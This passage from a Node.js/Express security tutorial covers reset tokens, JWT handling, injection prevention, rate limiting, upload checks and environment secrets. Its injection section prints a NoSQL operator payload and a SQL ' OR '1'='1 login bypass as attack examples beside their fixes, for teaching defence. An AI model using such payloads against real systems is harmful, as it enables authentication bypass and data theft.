  // Set expiration (10 minutes)
  this.passwordResetExpires = Date.now() + 10 * 60 * 1000;
  
  return resetToken;  // Return plain token to send via email
};
```

**Controller**:

```js
exports.forgotPassword = async (req, res) => {
  const user = await User.findOne({ email: req.body.email });
  
  if (!user) {
    // Don't reveal if email exists or not
    return res.json({ 
      success: true, 
      message: "If email exists, reset link sent" 
    });
  }
  
  // Generate token
  const resetToken = user.createPasswordResetToken();
  await user.save();
  
  // Send email with resetToken
  const resetURL = `${req.protocol}://${req.get("host")}/reset-password/${resetToken}`;
  // Send email...
  
  res.json({ 
    success: true, 
    message: "Reset link sent to email" 
  });
};

exports.resetPassword = async (req, res) => {
  // Hash the token from URL
  const hashedToken = crypto
    .createHash("sha256")
    .update(req.params.token)
    .digest("hex");
  
  // Find user with valid token
  const user = await User.findOne({
    passwordResetToken: hashedToken,
    passwordResetExpires: { $gt: Date.now() }
  });
  
  if (!user) {
    return res.status(400).json({ 
      success: false, 
      error: "Invalid or expired token" 
    });
  }
  
  // Update password
  user.passwordHash = req.body.password;
  user.passwordResetToken = undefined;
  user.passwordResetExpires = undefined;
  await user.save();
  
  res.json({ 
    success: true, 
    message: "Password reset successful" 
  });
};
```

---

## 5. JWT Security

### 5.1 Best Practices

```js
const jwt = require("jsonwebtoken");

// ============================================
// SECURE JWT GENERATION
// ============================================

function generateToken(user) {
  return jwt.sign(
    {
      id: user._id,
      email: user.email,
      role: user.role
      // DON'T include: password, sensitive data
    },
    process.env.JWT_SECRET,  // Strong secret (min 32 characters)
    {
      expiresIn: "15m",  // Short expiration
      issuer: "myapp.com",
      audience: "myapp.com"
    }
  );
}

// ============================================
// REFRESH TOKEN (Long-lived)
// ============================================

function generateRefreshToken(user) {
  return jwt.sign(
    { id: user._id },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: "7d" }
  );
}
```

### 5.2 Secure JWT Storage

**DON'T**:
```js
// ❌ localStorage (vulnerable to XSS)
localStorage.setItem("token", token);

// ❌ Regular cookie (vulnerable to XSS)
res.cookie("token", token);
```

**DO**:
```js
// ✅ HTTP-only cookie (not accessible via JavaScript)
res.cookie("token", token, {
  httpOnly: true,     // Prevents XSS
  secure: true,       // HTTPS only
  sameSite: "strict", // CSRF protection
  maxAge: 900000      // 15 minutes
});

res.cookie("refreshToken", refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
});
```

### 5.3 JWT Verification

```js
const jwt = require("jsonwebtoken");

async function authMiddleware(req, res, next) {
  try {
    // Extract token from cookie
    const token = req.cookies.token;
    
    if (!token) {
      return res.status(401).json({ 
        success: false, 
        error: "Not authenticated" 
      });
    }
    
    // Verify token
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    
    // Attach user to request
    req.user = decoded;
    next();
    
  } catch (error) {
    if (error.name === "TokenExpiredError") {
      return res.status(401).json({ 
        success: false, 
        error: "Token expired" 
      });
    }
    
    return res.status(401).json({ 
      success: false, 
      error: "Invalid token" 
    });
  }
}
```

---

## 6. SQL/NoSQL Injection Prevention

### 6.1 MongoDB Injection

**Vulnerable code**:

```js
// ❌ NEVER DO THIS
const user = await User.findOne({ 
  email: req.body.email  // What if req.body.email is { $ne: null }?
});
```

**Attack**:
```json
{
  "email": { "$ne": null },
  "password": { "$ne": null }
}
```

This would match ANY user!

**Solution**:

```bash
npm install express-mongo-sanitize
```

```js
const mongoSanitize = require("express-mongo-sanitize");

// Remove $ and . from user input
app.use(mongoSanitize());
```

**Or validate manually**:

```js
body("email")
  .isEmail()  // Only allows valid email format
  .trim()
```

### 6.2 SQL Injection (PostgreSQL)

**Vulnerable code**:

```js
// ❌ NEVER DO THIS
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;
```

**Attack**:
```
email: admin@example.com' OR '1'='1
```

Results in:
```sql
SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'
```

**Solution**: Use parameterized queries

```js
// ✅ DO THIS
const query = "SELECT * FROM users WHERE email = $1";
const result = await pool.query(query, [req.body.email]);
```

---

## 7. Rate Limiting

**Already covered in REST API chapter**, but here's security-focused config:

```js
const rateLimit = require("express-rate-limit");

// ============================================
// AGGRESSIVE LIMITING FOR AUTH ENDPOINTS
// ============================================
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,  // 5 attempts
  message: "Too many login attempts, try again later",
  standardHeaders: true,
  legacyHeaders: false,
  
  // Skip successful requests
  skipSuccessfulRequests: true,
  
  // Custom key generator (use IP + user agent)
  keyGenerator: (req) => {
    return req.ip + req.headers["user-agent"];
  }
});

router.post("/login", authLimiter, authController.login);
```

---

## 8. File Upload Security

### 8.1 Restrict File Types

```js
const multer = require("multer");
const path = require("path");

const fileFilter = (req, file, cb) => {
  // Allowed extensions
  const allowedTypes = /jpeg|jpg|png|gif|pdf/;
  
  // Check extension
  const extname = allowedTypes.test(
    path.extname(file.originalname).toLowerCase()
  );
  
  // Check MIME type (more reliable than extension)
  const mimetype = allowedTypes.test(file.mimetype);
  
  if (extname && mimetype) {
    return cb(null, true);
  }
  
  cb(new Error("Invalid file type. Only JPEG, PNG, GIF, PDF allowed"));
};

const upload = multer({
  storage: multer.diskStorage({
    destination: "uploads/",
    filename: (req, file, cb) => {
      // Generate unique filename (don't trust user's filename)
      const uniqueName = `${Date.now()}-${Math.random().toString(36).substring(7)}${path.extname(file.originalname)}`;
      cb(null, uniqueName);
    }
  }),
  limits: {
    fileSize: 5 * 1024 * 1024  // 5MB max
  },
  fileFilter: fileFilter
});
```

### 8.2 Scan Files for Malware

```bash
npm install clamscan
```

```js
const NodeClam = require("clamscan");

const clamscan = await new NodeClam().init({
  clamdscan: {
    host: "localhost",
    port: 3310
  }
});

// After file upload
const { isInfected, viruses } = await clamscan.isInfected(filePath);

if (isInfected) {
  fs.unlinkSync(filePath);  // Delete infected file
  return res.status(400).json({ 
    error: "File contains malware" 
  });
}
```

---

## 9. Environment Variables

### 9.1 Secure Storage

**File**: `.env`

```bash
# ❌ NEVER commit this file to Git!

# Database
MONGO_URI=mongodb://localhost:27017/myapp
DB_USER=admin
DB_PASSWORD=super_secret_password

# JWT
JWT_SECRET=your-super-long-secret-key-min-32-chars-random
JWT_REFRESH_SECRET=another-long-secret-for-refresh-tokens

# API Keys
STRIPE_SECRET_KEY=sk_live_xxxxxxxxxxxxx
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# App
NODE_ENV=production
PORT=3000
CLIENT_URL=https://myapp.com
```

**File**: `.gitignore`

```
# CRITICAL: Never commit these
.env
.env.local
.env.production
```

### 9.2 Validate Environment Variables

**File**: `src/config/env.js`

```js
require("dotenv").config();

// ============================================
// VALIDATE REQUIRED ENV VARS
// ============================================
const requiredEnvVars = [
  "MONGO_URI",
  "JWT_SECRET",
  "JWT_REFRESH_SECRET",
  "NODE_ENV"
];

requiredEnvVars.forEach((varName) => {
  if (!process.env[varName]) {
    throw new Error(`Missing required environment variable: ${varName}`);
  }
});

// ============================================
// VALIDATE JWT SECRET LENGTH
// ============================================
if (process.env.JWT_SECRET.length < 32) {
  throw new Error("JWT_SECRET must be at least 32 characters");
}

module.exports = {
  mongoUri: process.env.MONGO_URI,
  jwtSecret: process.env.JWT_SECRET,
  jwtRefreshSecret: process.env.JWT_REFRESH_SECRET,
  nodeEnv: process.env.NODE_ENV,
  port: process.env.PORT || 3000,
  clientUrl: process.env.CLIENT_URL
};
```

---

## 10. HTTPS Enforcement

### 10.1 Redirect HTTP to HTTPS

```js
// Force HTTPS in production
if (process.env.NODE_ENV === "production") {
  app.use((req, res, next) => {
    if (req.header("x-forwarded-proto") !== "https") {
      return res.redirect(`https://${req.header("host")}${req.url}`);
    }
    next();
  });
}
```

### 10.2 HSTS Header

```js
// Already handled by Helmet, but can configure separately
app.use(helmet.hsts({
  maxAge: 31536000,  // 1 year
  includeSubDomains: true,
  preload: true
}));
```

---

## 11. Security Checklist

Before going to production:

### Authentication & Authorization
- [ ] Passwords hashed with bcrypt (min 10 rounds)
- [ ] JWT tokens stored in HTTP-only cookies
- [ ] Short token expiration (15 minutes)
- [ ] Refresh token implementation
- [ ] Password reset flow with expiring tokens

### Input Validation
- [ ] All user inputs validated
- [ ] Inputs sanitized (HTML, SQL)
- [ ] File uploads restricted by type and size
- [ ] express-mongo-sanitize installed

### Security Headers
- [ ] Helmet.js configured
- [ ] CORS properly configured (not allowing *)
- [ ] HTTPS enforced in production

### Rate Limiting
- [ ] Rate limiters on auth endpoints
- [ ] General API rate limiting
- [ ] Different limits for different endpoints

### Environment
- [ ] .env not committed to Git
- [ ] All secrets in environment variables
- [ ] Environment variables validated on startup
- [ ] Different configs for dev/staging/prod

### Dependencies
- [ ] No known vulnerabilities (`npm audit`)
- [ ] Dependencies up to date
- [ ] Unused dependencies removed

### Error Handling
- [ ] No sensitive data in error messages
- [ ] Stack traces hidden in production
- [ ] Errors logged but not exposed to users

### Database
- [ ] Parameterized queries (no string interpolation)
- [ ] Database user has minimum required permissions
- [ ] Database backups configured

---

## 12. Complete Secure App Example

**File**: `src/app.js`

```js
const express = require("express");
const helmet = require("helmet");
const cors = require("cors");
const mongoSanitize = require("express-mongo-sanitize");
const cookieParser = require("cookie-parser");
const corsOptions = require("./config/cors");
const { generalLimiter } = require("./middlewares/rateLimiter");
const { errorHandler } = require("./middlewares/errorHandler");

const app = express();

// ============================================
// SECURITY MIDDLEWARE (Early in chain)
// ============================================

// Security headers
app.use(helmet());

// CORS
app.use(cors(corsOptions));

// Rate limiting
app.use("/api", generalLimiter);

// Prevent NoSQL injection
app.use(mongoSanitize());

// ============================================
// BODY PARSING
// ============================================
app.use(express.json({ limit: "10kb" }));  // Limit body size
app.use(express.urlencoded({ extended: true, limit: "10kb" }));
app.use(cookieParser());

// ============================================
// ROUTES
// ============================================
app.use("/api/auth", require("./routes/auth.routes"));
app.use("/api/users", require("./routes/user.routes"));

// ============================================
// ERROR HANDLING (Last)
// ============================================
app.use(errorHandler);

module.exports = app;
```

---

## Summary

**Security layers implemented**:

1. ✅ Input validation & sanitization (express-validator)
2. ✅ Security headers (Helmet.js)
3. ✅ CORS configuration
4. ✅ Password hashing (bcrypt)
5. ✅ JWT security (HTTP-only cookies, short expiration)
6. ✅ Injection prevention (mongoSanitize, parameterized queries)
7. ✅ Rate limiting
8. ✅ File upload restrictions
9. ✅ Environment variable security
10. ✅ HTTPS enforcement

**Remember**: Security is not one-time - keep dependencies updated and follow the checklist for every project.
